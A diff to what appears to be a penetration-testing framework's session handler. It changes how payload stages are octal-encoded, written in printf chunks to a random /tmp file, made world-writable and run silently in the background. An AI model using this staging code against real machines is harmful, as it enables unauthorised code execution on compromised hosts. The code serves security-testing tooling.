@@ -61,13 +61,20 @@ class Handler(TCP):
             self.badges.output_error("Failed to handle session!")
             return None
 
+    def bytes_to_octal(self, bytes_obj):
+        byte_octals = []
+        for byte in bytes_obj:
+            byte_octal = '\\' + oct(byte)[2:]
+            byte_octals.append(byte_octal)
+        return ''.join(byte_octals)
+
     def echo_stage(self, payload, sender, args=[], payload_args=None, location='/tmp', encode=False):
         self.badges.output_process("Sending payload stage...")
         filename = binascii.hexlify(os.urandom(8)).decode()
         path = location + '/' + filename
 
         echo_stream = "printf '{}' >> {}"
-        echo_prefix = "\\x"
+        echo_prefix = "\\"
         echo_max_length = 100
 
         size = len(payload)
@@ -76,9 +83,7 @@ class Handler(TCP):
         self.badges.output_process(f"Uploading to {path}...")
         for i in range(0, num_parts):
             current = i * echo_max_length
-
-            block = str(binascii.hexlify(payload[current:current + echo_max_length]), "utf-8")
-            block = echo_prefix + echo_prefix.join(a + b for a, b in zip(block[::2], block[1::2]))
+            block = self.bytes_to_octal(payload[current:current + echo_max_length])
             command = echo_stream.format(block, path)
 
             if encode:
@@ -89,9 +94,9 @@ class Handler(TCP):
         args = args if args is not None else ""
 
         if encode:
-            sender(*args, f"chmod 777 {path}; /bin/sh -c '{path} {payload_args}' 2>/dev/null &\n".encode())
+            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &\n".encode())
         else:
-            sender(*args, f"chmod 777 {path}; /bin/sh -c '{path} {payload_args}' 2>/dev/null &")
+            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &")
 
     def set_session_details(self, payload, session):
         if not session.details['Type']:
